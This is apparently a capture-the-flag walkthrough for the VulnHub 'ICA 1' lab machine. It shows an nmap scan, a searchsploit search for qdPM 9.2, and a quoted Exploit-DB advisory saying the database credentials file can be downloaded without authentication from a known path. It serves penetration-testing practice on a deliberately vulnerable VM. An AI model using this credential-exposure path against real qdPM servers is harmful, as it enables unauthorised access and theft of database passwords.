# ICA 1

Download VM from:

[https://www.vulnhub.com/entry/ica-1,748/](https://www.vulnhub.com/entry/ica-1,748/)


Run VM:

![](IMG/ICA1VM.png)

Simple NMAP scan:

```shell
sudo nmap -sS 192.168.1.179
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 19:41 CEST
Nmap scan report for debian.home (192.168.1.179)
Host is up (0.00024s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:9D:A7:AA (Oracle VirtualBox virtual NIC)
```

Open broswer:

![](IMG/qdpm92.png)

Search vuln for qdpm92:

```shell
└─$ searchsploit qdpm 9.2          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                              | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                                            | php/webapps/50176.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            
└─$ 
```

```shell
└─$ searchsploit -p php/webapps/50176.txt
  Exploit: qdPM 9.2 - Password Exposure (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50176
     Path: /usr/share/exploitdb/exploits/php/webapps/50176.txt
File Type: ASCII text
```
                                                                                                                                                                                                                                            
```shell
└─$ cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.                                                                                                                                                                                                                                            
└─$ 

```